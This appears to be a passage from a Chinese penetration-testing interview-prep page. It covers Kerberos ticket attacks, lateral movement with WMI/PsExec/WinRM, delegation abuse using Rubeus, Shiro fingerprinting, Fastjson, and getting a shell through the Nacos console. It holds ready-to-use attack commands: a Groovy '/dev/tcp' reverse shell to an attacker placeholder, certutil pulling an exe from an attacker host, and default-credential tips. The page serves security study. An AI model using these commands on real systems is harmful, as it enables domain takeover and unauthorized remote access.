<td>技术新，相对复杂</td>
</tr>
</tbody></table>
<hr>
<h3 id="PTT-有哪些攻击方法"><a href="#PTT-有哪些攻击方法" class="headerlink" title="PTT 有哪些攻击方法"></a>PTT 有哪些攻击方法</h3><p><strong>1. 获取 Kerberos 票据（TGT 或 ST）</strong></p>
<p>攻击的第一步是获取一个有效的 Kerberos 票据。攻击者通常会利用以下几种方式：</p>
<ul>
<li><strong>Mimikatz</strong>：这是最常用的工具。通过 <code>Mimikatz</code>，攻击者可以在一个已经获得管理员权限的机器上，从内存中导出用户的 Kerberos 票据缓存。这些缓存中可能包含着 TGT（Ticket Granting Ticket，票据授予票据）或 ST（Service Ticket，服务票据）</li>
<li><strong>窃取和伪造</strong>：攻击者可以窃取域管理员账户的 Kerberos 票据，然后利用这些票据伪造或生成新的票据，以便访问域内任何服务</li>
</ul>
<p><strong>2. 利用和注入票据</strong></p>
<p>一旦攻击者获取了票据，他们会将其注入到内存中，以冒充合法用户：</p>
<ul>
<li><strong>注入 TGT</strong>：攻击者可以将域管理员账户的 TGT 注入到内存中。通过这个 TGT，他们可以向 KDC 申请任意服务的 ST，从而完全控制域内的所有服务和资源</li>
<li><strong>注入 ST</strong>：攻击者可以直接注入一个特定服务的 ST。这种方法通常用于横向移动，即从一台服务器跳到另一台服务器，以访问特定的服务，如数据库或文件共享</li>
</ul>
<hr>
<h3 id="PTT-有哪些攻击方法-1"><a href="#PTT-有哪些攻击方法-1" class="headerlink" title="PTT 有哪些攻击方法"></a>PTT 有哪些攻击方法</h3><p><strong>1. 获取 Kerberos 票据（TGT 或 ST）</strong></p>
<p>攻击的第一步是获取一个有效的 Kerberos 票据。攻击者通常会利用以下几种方式：</p>
<ul>
<li><strong>Mimikatz</strong>：这是最常用的工具。通过 <code>Mimikatz</code>，攻击者可以在一个已经获得管理员权限的机器上，从内存中导出用户的 Kerberos 票据缓存。这些缓存中可能包含着 TGT（Ticket Granting Ticket，票据授予票据）或 ST（Service Ticket，服务票据）</li>
<li><strong>窃取和伪造</strong>：攻击者可以窃取域管理员账户的 Kerberos 票据，然后利用这些票据伪造或生成新的票据，以便访问域内任何服务</li>
</ul>
<p><strong>2. 利用和注入票据</strong></p>
<p>一旦攻击者获取了票据，他们会将其注入到内存中，以冒充合法用户：</p>
<ul>
<li><strong>注入 TGT</strong>：攻击者可以将域管理员账户的 TGT 注入到内存中。通过这个 TGT，他们可以向 KDC 申请任意服务的 ST，从而完全控制域内的所有服务和资源</li>
<li><strong>注入 ST</strong>：攻击者可以直接注入一个特定服务的 ST。这种方法通常用于横向移动，即从一台服务器跳到另一台服务器，以访问特定的服务，如数据库或文件共享</li>
</ul>
<hr>
<h3 id="横向渗透命令执行手段"><a href="#横向渗透命令执行手段" class="headerlink" title="横向渗透命令执行手段"></a>横向渗透命令执行手段</h3><p><strong>1. WMI</strong></p>
<p><strong>WMI</strong> 是 Windows 操作系统中的一个核心组件，它允许系统管理员对本地或远程计算机进行管理。攻击者可以利用 WMI 强大的功能，在远程主机上执行命令，而不需要依赖其他第三方工具</p>
<p><strong>常用命令：</strong></p>
<ul>
<li><code>wmic /node:目标IP /user:用户名 /password:密码 process call create &quot;cmd /c dir &gt; c:\result.txt&quot;</code>：这个命令可以在目标主机上执行 <code>dir</code> 命令，并将结果输出到 <code>c:\result.txt</code> 文件</li>
<li><code>wmic /node:目标IP /user:用户名 /password:密码 process call create &quot;powershell.exe -e &lt;Base64编码的命令&gt;&quot;</code>：通过 WMI 结合 PowerShell，可以执行更复杂的命令，绕过一些安全检测</li>
</ul>
<p><strong>2. PsExec</strong></p>
<p><strong>PsExec</strong> 是 Sysinternals 工具集中的一个经典工具，它允许在远程计算机上以本地 SYSTEM 账户身份执行命令。它利用 SMB 协议在远程主机上创建一个名为 <code>PSEXESVC</code> 的服务，通过这个服务来执行命令</p>
<p><strong>常用命令：</strong></p>
<ul>
<li><code>PsExec.exe \\目标IP -u 用户名 -p 密码 cmd.exe</code>：直接在远程主机上打开一个交互式 <code>cmd</code> 终端</li>
<li><code>PsExec.exe \\目标IP -u 用户名 -p 密码 -s cmd.exe</code>：以 SYSTEM 权限打开一个 <code>cmd</code> 终端，这是最常见也是最强大的用法</li>
</ul>
<p><strong>PsExec 的缺点是可能会被杀毒软件检测到，并且会在目标主机上留下服务创建和删除的日志</strong></p>
<p><strong>3. WinRM</strong></p>
<p><strong>WinRM</strong> 是微软基于 WS-Management 标准实现的管理协议，默认在 Windows Server 2012 及其以上版本中启用。它可以通过 HTTP 或 HTTPS 协议进行远程管理，非常适合在防火墙严格的环境下使用</p>
<p><strong>常用命令：</strong></p>
<ul>
<li><code>winrs -r:目标IP -u:用户名 -p:密码 ipconfig</code>：在目标主机上执行 <code>ipconfig</code> 命令</li>
<li><code>Invoke-Command -ComputerName 目标IP -Credential 用户名 -ScriptBlock &#123;whoami&#125;</code>：使用 PowerShell 的 <code>Invoke-Command</code> cmdlet，可以更灵活地执行命令和脚本</li>
</ul>
<p><strong>4. UNC 路径执行</strong></p>
<p>在某些情况下，如果目标主机开启了 <code>SMB</code> 或 <code>IPC$</code> 共享，并且你拥有相应的权限，可以直接利用 <code>UNC</code> 路径（<code>\\IP\共享名</code>）来执行文件</p>
<p><strong>常用命令：</strong></p>
<ul>
<li><code>copy \\攻击机IP\share\a.exe c:\windows\temp\a.exe</code>：将攻击机上的可执行文件复制到目标主机上</li>
<li><code>schtasks /create /s 目标IP /tn &quot;MyTask&quot; /tr c:\windows\temp\a.exe /sc once /st 00:00</code>：利用计划任务在特定时间执行复制过来的文件</li>
</ul>
<hr>
<h3 id="PTH、PTT、PTK-三者区别"><a href="#PTH、PTT、PTK-三者区别" class="headerlink" title="PTH、PTT、PTK 三者区别"></a>PTH、PTT、PTK 三者区别</h3><p><strong>Pass-the-Hash (PtH)</strong></p>
<p><strong>PtH</strong> 是最广为人知的技术，它指的是一种攻击方法。攻击者通过窃取用户在内存中的 <strong>NTLM 哈希</strong>，并直接使用这个哈希来作为凭据进行身份验证，而不需要知道明文密码</p>
<ul>
<li><strong>工作原理：</strong> 当 Windows 用户登录时，系统会生成一个 NTLM 哈希并存储在内存中。PtH 攻击者可以利用 Mimikatz 等工具从内存中抓取这个哈希，然后将它传递给目标服务（如 SMB、WMI），假冒该用户进行登录</li>
<li><strong>应用场景：</strong> 最典型的应用是横向移动。如果攻击者拿到了域管理员的 NTLM 哈希，就可以在其他机器上直接使用这个哈希来建立远程连接、执行命令，甚至完全控制整个域</li>
<li><strong>常用工具：</strong> <strong>Mimikatz</strong> 是 PtH 攻击的核心工具，它的 <code>sekurlsa::logonpasswords</code> 和 <code>sekurlsa::pth</code> 功能就是为此而生</li>
</ul>
<p><strong>Pass-the-Ticket (PtT)</strong></p>
<p><strong>PtT</strong> 则是利用 Kerberos 协议的攻击技术。它指的是攻击者窃取了用户在内存中的 <strong>Kerberos 票据（Ticket Granting Ticket, TGT）</strong>，然后将这个票据注入到当前会话中，从而获得访问权限</p>
<ul>
<li><strong>工作原理：</strong> Kerberos 认证依赖于 TGT。当用户成功登录域时，域控制器会颁发一个 TGT。PtT 攻击者可以利用工具从内存中导出这个 TGT，并将其加载到另一台机器的内存中。加载后，该机器就可以向域内的其他服务发起访问请求，而不需要提供哈希或密码</li>
<li><strong>与 PtH 的区别：</strong><ul>
<li><strong>协议不同：</strong> PtT 针对的是 <strong>Kerberos</strong> 协议，而 PtH 针对的是 <strong>NTLM</strong> 协议</li>
<li><strong>对象不同：</strong> PtT 操作的是 <strong>Kerberos 票据</strong>，PtH 操作的是 <strong>NTLM 哈希</strong></li>
<li><strong>更隐蔽：</strong> Kerberos 认证通常比 NTLM 更难被检测，因为它不涉及明文密码或哈希在网络中的传输</li>
</ul>
</li>
</ul>
<p><strong>Pass-the-Key (PtK)</strong></p>
<p><strong>PtK</strong> 是一种更新、更高级的哈希传递技术，它通常与 <strong>AES 加密</strong>有关。攻击者不再传递 NTLM 哈希或 Kerberos 票据，而是利用用户的 <strong>AES 密钥</strong>来伪造 Kerberos 认证过程</p>
<ul>
<li><strong>工作原理：</strong> 在 Windows 2008 及更高版本的系统中，Kerberos 票据的加密和解密都可能使用 AES 密钥。PtK 攻击者从内存中提取出这个 AES 加密密钥，然后用它来伪造 Kerberos 票据，实现身份验证。这种方法通常用于绕过某些安全限制或在更现代的 Kerberos 环境中进行攻击</li>
<li><strong>与 PtH&#x2F;PtT 的区别：</strong><ul>
<li><strong>对象不同：</strong> PtK 利用的是 <strong>AES 密钥</strong>，而不是 NTLM 哈希或 Kerberos 票据</li>
<li><strong>安全性更高：</strong> AES 密钥是更强大的加密凭据，攻击者拿到它后，几乎可以完全伪造 Kerberos 认证过程</li>
<li><strong>应用场景：</strong> 在一些对 Kerberos 票据有额外安全控制的环境中，PtK 可能是更有效的选择</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>Pass-the-Hash (PtH)</th>
<th>Pass-the-Ticket (PtT)</th>
<th>Pass-the-Key (PtK)</th>
</tr>
</thead>
<tbody><tr>
<td>攻击对象</td>
<td>NTLM 哈希</td>
<td>Kerberos 票据 (TGT)</td>
<td>AES 密钥</td>
</tr>
<tr>
<td>利用协议</td>
<td>NTLM</td>
<td>Kerberos</td>
<td>Kerberos</td>
</tr>
<tr>
<td>核心工具</td>
<td>Mimikatz、Impacket</td>
<td>Mimikatz、Impacket</td>
<td>Mimikatz</td>
</tr>
<tr>
<td>常见场景</td>
<td>Windows 2003&#x2F;2008 老环境，横向移动</td>
<td>Windows 2008+ Kerberos 环境，权限维持</td>
<td>现代 Kerberos 环境，更隐蔽的攻击</td>
</tr>
<tr>
<td>核心思想</td>
<td>伪造哈希</td>
<td>注入票据</td>
<td>伪造密钥</td>
</tr>
</tbody></table>
<hr>
<h3 id="一台机器不能出网，如何把一个-exe-文件放到对应的目标机器上去"><a href="#一台机器不能出网，如何把一个-exe-文件放到对应的目标机器上去" class="headerlink" title="一台机器不能出网，如何把一个 exe 文件放到对应的目标机器上去"></a>一台机器不能出网，如何把一个 exe 文件放到对应的目标机器上去</h3><p><strong>1. 利用现有会话通道</strong></p>
<p>如果你的权限获取是通过某个工具（如 Meterpreter、Cobalt Strike 等）建立的会话，并且这个会话本身可以实现文件传输，那么这是最直接的方法</p>
<ul>
<li><strong>Meterpreter 的 <code>upload</code> 命令</strong>: 如果你已经拿到了 Meterpreter 会话，直接使用 <code>upload /path/to/local/file C:\path\on\target\machine</code> 命令就可以将本地文件上传到目标机器</li>
<li><strong>Cobalt Strike 的 <code>upload</code> 命令</strong>: 类似地，在 Cobalt Strike 的 Beacon 会话中，<code>upload /path/to/local/file C:\path\on\target\machine</code> 同样可以完成任务</li>
<li><strong>nc (Netcat) 通道</strong>: 如果没有 Meterpreter 或 Cobalt Strike，但能通过其他方式建立一个 <code>nc</code> 连接，可以在本地机器使用 <code>nc -l -p 4444 &lt; file.exe</code>，然后在目标机器上使用 <code>nc &lt;本地IP&gt; 4444 &gt; file.exe</code> 来进行文件传输</li>
</ul>
<p><strong>2. 利用系统自带工具或协议</strong></p>
<p>如果无法建立现有的会话通道，或者现有工具无法传输文件，我们可以利用目标机器上已有的工具和协议</p>
<ul>
<li><strong>SMB&#x2F;Cifs 共享</strong>: 如果目标机器在 Windows 内网环境中，并且你可以访问到一个可以上传文件的 SMB 共享。<ol>
<li><strong>在跳板机上开启共享</strong>: 使用 <code>smbserver.py</code> (Impacket 工具集) 或 Windows 自带的共享功能，在跳板机上共享一个目录</li>
<li><strong>在目标机上连接共享</strong>: 在目标机上使用 <code>net use Z: \\&lt;跳板机IP&gt;\share</code> 命令挂载共享目录</li>
<li><strong>复制文件</strong>: 使用 <code>copy Z:\file.exe C:\</code> 将文件复制到目标机器</li>
</ol>
</li>
<li><strong>FTP 服务</strong>: 如果目标机器或跳板机上有 FTP 服务<ol>
<li><strong>在跳板机上开启 FTP 服务</strong>: 确保 FTP 服务可以被目标机访问到</li>
<li><strong>在目标机上使用 <code>ftp</code> 命令</strong>: 在目标机上使用 <code>ftp</code> 客户端连接到跳板机，然后使用 <code>get</code> 或 <code>put</code> 命令来传输文件</li>
</ol>
</li>
<li><strong>HTTP 服务</strong>: 如果跳板机上可以开启一个简易的 HTTP 服务<ol>
<li><strong>在跳板机上开启 HTTP 服务</strong>: 使用 Python 的 <code>http.server</code> 或 <code>SimpleHTTPServer</code> 模块，如 <code>python -m http.server 8080</code></li>
<li><strong>在目标机上使用 <code>certutil</code> 或 PowerShell 下载</strong>: 在目标机上使用 <code>certutil.exe -urlcache -split -f http://&lt;跳板机IP&gt;:8080/file.exe C:\file.exe</code> 或 PowerShell 的 <code>Invoke-WebRequest</code> 命令下载文件。这种方式在很多 Windows 环境中非常有效，因为它绕过了部分防火墙</li>
</ol>
</li>
</ul>
<p><strong>3. 利用特殊编码或分割传输</strong></p>
<p>如果上述方法都不行，或者网络环境非常严格，可以考虑将文件进行编码或分割传输</p>
<ul>
<li><strong>Base64 编码</strong>:<ol>
<li><strong>在本地编码</strong>: 使用 <code>base64 file.exe &gt; file.txt</code> 将文件编码成文本</li>
<li><strong>传输文本</strong>: 将生成的文本文件 <code>file.txt</code> 通过剪贴板、或者通过其他能传输文本的方式（如日志文件、数据库记录等）传输到目标机</li>
<li><strong>在目标机解码</strong>: 在目标机上使用 <code>certutil.exe -decode file.txt file.exe</code> 或 PowerShell 将文本解码回可执行文件。这种方法非常灵活，可以在几乎所有有文本传输的地方使用</li>
</ol>
</li>
<li><strong>文件分割</strong>: 如果文件过大，可以先将文件分割成多个小块，然后逐一传输，最后在目标机上合并。这通常和上面的方法结合使用</li>
</ul>
<hr>
<h3 id="说说域内委派"><a href="#说说域内委派" class="headerlink" title="说说域内委派"></a>说说域内委派</h3><p><strong>1. 基础知识：委派的类型</strong></p>
<p>首先，我们需要理解域内委派的两种主要类型，因为它们的攻击方法截然不同</p>
<p><strong>a. 非约束性委派</strong></p>
<p>这是最古老、也最危险的一种委派方式</p>
<ul>
<li><strong>工作原理</strong>：当一个用户访问配置了非约束性委派的服务（比如一个 Web 服务器）时，域控制器会把该用户的**票据授予票据（TGT）**发送给这个服务。这个服务会把用户的 TGT 缓存到内存中，以便后续代表用户去访问其他任何服务</li>
<li><strong>渗透利用点</strong>：<ol>
<li><strong>票据窃取（TGT Stealing）</strong>：非约束性委派的关键漏洞在于，服务会<strong>在内存中缓存所有访问过它的用户的 TGT</strong></li>
<li><strong>伪造身份</strong>：如果一个渗透测试人员能够控制这个服务账户（例如通过弱密码、令牌窃取等），他就可以<strong>从内存中导出所有缓存的 TGT</strong>，包括域管理员的 TGT</li>
<li><strong>万能钥匙</strong>：拿到域管理员的 TGT 后，攻击者就拥有了<strong>完全的域管理员权限</strong>，可以代表该管理员去访问域内任何一台机器或服务，实现了最高级别的权限提升</li>
</ol>
</li>
</ul>
<p><strong>攻击思路</strong>：</p>
<ol>
<li><strong>侦察</strong>：使用工具（如 PowerView、SharpHound）枚举所有配置了非约束性委派的机器账户或用户账户。<ul>
<li><strong>PowerView 命令</strong>：<code>Get-DomainUser -UnconstrainedDelegation</code> 或 <code>Get-DomainComputer -UnconstrainedDelegation</code></li>
</ul>
</li>
<li><strong>等待和诱骗</strong>：找到一个目标后，我们需要等待或诱骗一个高权限用户（如域管理员）来访问这台机器上的服务</li>
<li><strong>票据导出</strong>：一旦高权限用户访问了，我们立即使用 <code>Mimikatz</code> 或 <code>Rubeus</code> 等工具，在被控机器上从内存中导出所有 TGT 票据</li>
<li><strong>票据复用</strong>：拿到域管理员的 TGT 后，我们可以使用 <code>Mimikatz</code> 的 <code>kerberos::ptt</code>（Pass The Ticket）功能，将票据注入到当前会话中，然后以域管理员的身份访问域内任何资源，比如 <code>net use \\DC01\c$ /y</code></li>
</ol>
<p><strong>b. 约束性委派</strong></p>
<p>这是为了解决非约束性委派的风险而引入的更安全的委派方式，它<strong>限制了服务可以代表用户访问的范围</strong>。但它依然存在攻击点</p>
<ul>
<li><strong>工作原理</strong>：与非约束性委派不同，约束性委派不会把用户的 TGT 传给服务。它利用 Kerberos 协议的扩展（S4U2Self 和 S4U2Proxy）来完成委派<ul>
<li><strong>S4U2Self</strong>：服务向 KDC（Key Distribution Center）证明它代表用户，并请求一个服务票据（ST）</li>
<li><strong>S4U2Proxy</strong>：服务用这个 ST 去请求另一个服务的 ST，但这个过程是<strong>严格受限</strong>的</li>
</ul>
</li>
<li><strong>渗透利用点</strong>：<ol>
<li><strong>滥用 S4U2Proxy</strong>：如果攻击者能够控制一个配置了约束性委派的服务账户，他可以滥用 S4U2Proxy 协议，<strong>冒充域内任何一个普通用户</strong>（甚至不存在的用户）去请求访问被委派的特定服务</li>
<li><strong>横向移动</strong>：这使得攻击者可以<strong>以任意用户的身份</strong>访问特定服务，即使该用户并没有访问权限，从而实现横向移动</li>
</ol>
</li>
</ul>
<p><strong>攻击思路</strong>：</p>
<ol>
<li><strong>侦察</strong>：找到配置了约束性委派的账户<ul>
<li><strong>PowerView 命令</strong>：<code>Get-DomainUser -Properties * | Where &#123;$_.msds-allowedtodelegateto&#125;</code></li>
</ul>
</li>
<li><strong>控制服务账户</strong>：通过密码喷洒、弱密码或凭证窃取等方式，获取一个配置了约束性委派的服务账户的权限</li>
<li><strong>执行 S4U2Proxy 攻击</strong>：使用 <code>Rubeus</code> 或 <code>Kekeo</code> 等工具，冒充一个域内用户（如 <code>Administrator</code>），向 KDC 请求访问目标服务的票据<ul>
<li><strong>Rubeus 命令示例</strong>：<code>Rubeus.exe s4u /user:victim-user /rc4:victim-user-hash /impersonateuser:administrator /altservice:HTTP/webservice.contoso.com /dc:DC01.contoso.com /ptt</code></li>
</ul>
</li>
<li><strong>票据复用</strong>：成功后，会将伪造的票据注入到当前会话，攻击者即可用管理员身份访问 <code>webservice.contoso.com</code></li>
</ol>
<p><strong>c. 基于资源的约束性委派</strong></p>
<p>这是 Windows Server 2012 引入的更精细的委派方式，它将委派配置在<strong>被访问的资源</strong>上，而不是服务账户上</p>
<ul>
<li><strong>渗透利用点</strong>：<ol>
<li><strong>ACL 滥用</strong>：如果攻击者控制了一台机器（例如，通过普通用户权限），并且该机器的ACL（访问控制列表）允许某个低权限账户进行委派配置，那么攻击者就可以<strong>将该机器配置为允许某个低权限账户进行委派</strong></li>
<li><strong>权限提升</strong>：攻击者可以利用这个漏洞，将一个低权限服务账户配置为可以代表任何用户访问这台机器，从而实现权限提升</li>
</ol>
</li>
</ul>
<hr>
<h3 id="怎么定位域管曾经登录哪些机器"><a href="#怎么定位域管曾经登录哪些机器" class="headerlink" title="怎么定位域管曾经登录哪些机器"></a>怎么定位域管曾经登录哪些机器</h3><p><strong>1. 利用事件日志（Event Logs）</strong></p>
<p>这是最直接，也是最基础的方法。Windows 服务器和客户端都会记录用户的登录事件，我们可以通过分析这些日志来追踪域管理员的行踪</p>
<ul>
<li><strong>事件 ID 4624</strong>：这是<strong>成功登录</strong>的事件 ID。我们需要关注以下几个关键信息：<ul>
<li><strong><code>Account Name</code></strong>：登录的账户名，我们要寻找域管理员账户，通常会包含 <code>Domain Admins</code> 组的成员</li>
<li><strong><code>Logon Type</code></strong>：登录类型<ul>
<li><strong><code>Type 2</code></strong>：交互式登录（Interactive），意味着用户直接在机器上操作</li>
<li><strong><code>Type 10</code></strong>：远程交互式登录（RemoteInteractive），意味着通过远程桌面（RDP）登录</li>
<li><strong><code>Type 3</code></strong>：网络登录（Network），这意味着通过网络服务访问，比如文件共享</li>
</ul>
</li>
</ul>
</li>
<li><strong>如何收集</strong>：<ul>
<li><strong>手动收集</strong>：登录到域控制器或其他服务器上，打开 <code>事件查看器</code>（Event Viewer），在 <code>Windows 日志</code> -&gt; <code>安全</code> 中筛选事件 ID 4624。这对于小型网络尚可，但对于大型网络效率很低</li>
<li><strong>脚本自动化</strong>：使用 PowerShell 脚本可以批量查询多台机器上的事件日志。例如，可以编写脚本遍历所有机器，然后筛选出域管理员的登录记录</li>
<li><strong>集中式日志管理</strong>：在大型企业中，通常会有 ELK Stack (Elasticsearch, Logstash, Kibana) 或 Splunk 等集中式日志管理系统。如果有权限访问这些系统，可以直接通过强大的搜索功能来查询域管理员的登录历史，这是效率最高的方式</li>
</ul>
</li>
</ul>
<p><strong>2. 利用 LAPS 或 GPO</strong></p>
<p>有些企业为了安全，会使用 **LAPS（本地管理员密码解决方案）**或 **GPO（组策略对象）**来管理本地管理员账户的密码。如果一个域管理员账户曾登录过这些机器并修改过本地管理员密码，那么这些信息可能会被记录下来</p>
<ul>
<li><strong>攻击思路</strong>：<ul>
<li><strong>LAPS 日志</strong>：LAPS 会记录管理员账户对本地密码的修改历史。我们可以通过查看这些日志来反推出是哪个域管理员在何时操作了哪台机器</li>
<li><strong>GPO 日志</strong>：如果管理员使用了 GPO 批量下发或修改了配置，这些操作也会在日志中留下痕迹</li>
</ul>
</li>
</ul>
<p><strong>3. 利用渗透工具自动化发现</strong></p>
<p>对于渗透测试工程师来说，手动分析日志太慢了。我们通常会使用专门的工具来自动化这个过程</p>
<ul>
<li><strong>BloodHound</strong>：这是内网渗透中最强大的关系图分析工具之一。它能够收集域内的各种信息，包括用户、组、机器、会话等等，然后将这些信息可视化<ul>
<li><strong>核心功能</strong>：BloodHound 的一个强大功能是<strong>会话（Session）分析</strong>。它可以识别出哪些账户登录了哪些机器，并用图表清晰地展示出来</li>
<li><strong>查询</strong>：在 BloodHound 中，你可以直接运行内置查询，例如“Find Computers to which a Domain Admin has logged on”（查找域管理员登录过的机器），它会立即返回所有相关机器列表</li>
</ul>
</li>
<li><strong>PowerView</strong>：这是一款基于 PowerShell 的信息收集工具，也是我们常用的利器<ul>
<li><strong>命令示例</strong>：<code>Get-NetSession</code> 可以用来枚举当前机器上的网络会话，从中筛选出域管理员的会话。<code>Get-NetLoggedon</code> 可以用来枚举本地机器上的登录用户，从中找到域管理员</li>
<li><strong>结合使用</strong>：我们会编写脚本，在多台机器上运行这些命令，然后将结果汇总起来，分析出域管理员的登录痕迹</li>
</ul>
</li>
</ul>
<hr>
<h1 id="7-中间件"><a href="#7-中间件" class="headerlink" title="7- 中间件"></a>7- 中间件</h1><h3 id="Fastjson-漏洞原理"><a href="#Fastjson-漏洞原理" class="headerlink" title="Fastjson 漏洞原理"></a>Fastjson 漏洞原理</h3><p>Fastjson 是阿里巴巴开源的一个高性能 JSON 解析库，它能够将 Java 对象序列化成 JSON 字符串，也能将 JSON 字符串反序列化成 Java 对象</p>
<p>Fastjson 漏洞的核心在于其 <strong>自动类型转换（<code>AutoType</code>）</strong> 功能</p>
<p>在 Fastjson 中，为了在反序列化时能够准确地恢复原始对象的类型，它提供了一个 <code>AutoType</code> 功能</p>
<p>当这个功能开启时，Fastjson 会在 JSON 字符串中加入一个特殊的字段 <strong><code>@type</code></strong>，用于标记这个 JSON 字符串对应的原始 Java 类的全限定名</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.example.User&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;张三&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">25</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>当 Fastjson 反序列化这个 JSON 字符串时，它会首先解析 <code>@type</code> 字段，发现是 <code>com.example.User</code> 类型，然后创建一个 <code>User</code> 对象，并把 <code>name</code> 和 <code>age</code> 字段的值填充进去</p>
<p>Fastjson 在反序列化时，会无条件地信任并加载 <code>@type</code> 字段指定的类。攻击者可以利用这一点，构造一个恶意的 JSON 字符串，让 <code>@type</code> 字段指向一个可以执行恶意操作的 <strong>Java 类</strong></p>
<hr>
<h3 id="如何判断靶标是否使用-Shiro"><a href="#如何判断靶标是否使用-Shiro" class="headerlink" title="如何判断靶标是否使用 Shiro"></a>如何判断靶标是否使用 Shiro</h3><p><strong>1. 查看 HTTP 请求和响应头</strong></p>
<p>这是最直接也最常用的方法。当一个网站使用 Shiro 框架时，它通常会在 HTTP 响应中设置一个特定的 Cookie</p>
<hr>
<ul>
<li><p><strong>Shiro Cookie:</strong> 检查 HTTP 响应头中的 <code>Set-Cookie</code> 字段。如果存在名为 <strong><code>rememberMe</code></strong> 的 Cookie，那么目标很可能使用了 Shiro 框架</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache-Coyote/1.1</span><br><span class="line">Set-Cookie: JSESSIONID=...; Path=/; HttpOnly</span><br><span class="line">Set-Cookie: rememberMe=...; Path=/; HttpOnly</span><br><span class="line">Content-Type: text/html;charset=UTF-8</span><br></pre></td></tr></table></figure>

<p>这个 <code>rememberMe</code> Cookie 是 Shiro 用来记住用户登录状态的。它的值是 Base64 编码的，这正是 Shiro-550 和 Shiro-721 漏洞的核心所在</p>
</li>
</ul>
<p><strong>2. 发送特定请求并观察响应</strong></p>
<p>除了查看响应头，我们还可以通过发送一个带有特定 Cookie 的请求，并观察服务器的响应来进一步确认</p>
<ul>
<li><p><strong>发送带无效 RememberMe Cookie 的请求:</strong> 发送一个 GET 请求到目标网站的任意页面，并在请求头中手动添加一个 <strong>无效的 <code>rememberMe</code> Cookie</strong>。例如，可以设置 <code>rememberMe=123</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.jsp HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Cookie: rememberMe=123</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>观察响应头:</strong> 如果目标使用了 Shiro，并且 <code>rememberMe</code> 验证失败，服务器通常会在响应头中返回一个 <strong><code>rememberMe=deleteMe</code></strong> 的 Cookie，来清除浏览器中无效的 Cookie。这是 Shiro 框架的一个典型特征</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; HttpOnly</span><br></pre></td></tr></table></figure>

<p>如果看到了 <code>rememberMe=deleteMe</code>，几乎可以 100% 确定目标使用了 Shiro 框架</p>
</li>
</ul>
<p><strong>3. 利用工具自动检测</strong></p>
<p>对于渗透测试工程师来说，手动测试虽然精确，但效率较低。我们可以使用一些自动化工具来快速检测</p>
<ul>
<li><strong>ShiroScan：</strong> 这是一款专门用于检测 Shiro 漏洞的工具。它能够自动发送带有特定 Payload 的请求，并根据响应来判断目标是否使用了 Shiro，以及是否存在可利用的漏洞</li>
<li><strong>Burp Suite 插件：</strong> 许多 Burp Suite 插件，如 <strong>Shiro-check</strong>，都提供了自动检测功能。你只需在代理中浏览目标网站，插件就会自动分析请求和响应，并提示是否发现了 Shiro 的痕迹</li>
</ul>
<hr>
<h3 id="Nacos-如何通过配置文件拿-Shell"><a href="#Nacos-如何通过配置文件拿-Shell" class="headerlink" title="Nacos 如何通过配置文件拿 Shell"></a>Nacos 如何通过配置文件拿 Shell</h3><p><strong>1. 信息收集与漏洞探测</strong></p>
<p>首先，需要找到目标 Nacos 服务的地址和端口。常见的默认端口是 <strong>8848</strong></p>
<ul>
<li><strong>访问 Nacos 控制台</strong>：通过浏览器访问 <code>http://&lt;Nacos_IP&gt;:8848/nacos</code></li>
<li><strong>判断是否存在未授权访问</strong>：如果无需登录即可访问控制台，则存在未授权访问漏洞</li>
<li><strong>尝试弱口令</strong>：如果需要登录，可以尝试使用 Nacos 的默认弱口令，例如 <code>nacos/nacos</code></li>
</ul>
<p><strong>2. 构造恶意 Groovy 配置文件</strong></p>
<p>在获取到 Nacos 控制台的权限后，下一步是构造一个包含恶意代码的配置文件</p>
<ul>
<li><strong>创建新的配置</strong>：在 Nacos 控制台中，进入“配置管理” -&gt; “配置列表”，点击“+”号创建新配置</li>
<li><strong>配置参数</strong>：<ul>
<li><strong>Data ID</strong>：配置的唯一标识，可以任意命名，例如 <code>shell.groovy</code></li>
<li><strong>Group</strong>：配置的分组，默认即可</li>
<li><strong>配置格式</strong>：<strong>非常关键的一步，必须选择 <code>Groovy</code></strong></li>
<li><strong>配置内容</strong>：在配置内容中写入恶意 Groovy 代码</li>
</ul>
</li>
</ul>
<p>以下是两种常见的 Groovy Shell 代码：</p>
<p><strong>反弹 Shell</strong>：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> process = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1&quot;</span>.execute()</span><br></pre></td></tr></table></figure>

<p>请将 <strong>攻击者IP</strong> 和 <strong>端口</strong> 替换为你自己的 IP 地址和监听端口</p>
<p><strong>命令执行</strong>：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> process = <span class="string">&quot;ls -la&quot;</span>.execute()</span><br><span class="line"><span class="keyword">def</span> output = <span class="keyword">new</span> StringBuilder()</span><br><span class="line">process.consumeProcessOutput(output, output)</span><br><span class="line">println output.toString()</span><br></pre></td></tr></table></figure>

<p>你可以将 <code>ls -la</code> 替换为你想要执行的任意命令</p>
